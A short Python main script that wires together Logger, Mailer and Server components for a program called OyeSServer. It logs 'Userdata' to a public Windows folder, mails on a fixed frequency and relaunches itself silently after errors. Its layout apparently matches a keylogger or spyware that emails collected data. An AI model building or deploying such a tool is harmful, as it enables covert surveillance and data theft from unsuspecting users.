from oyesserver import Server
from oyeslogger import Logger
from oyesmailer import Mailer


class OyeSServer:

    # Defines the component instances
    logger = None
    mailer = None
    server = None

    def main(self):
        self.logger = Logger("C:\\Users\\Public\\", "Userdata")
        self.mailer = Mailer(self, freq=20)
        self.server = Server(self)


if __name__ == '__main__':
    try:
        server = OyeSServer()
        server.main()
    except:
        server = OyeSServer()
        server.main()
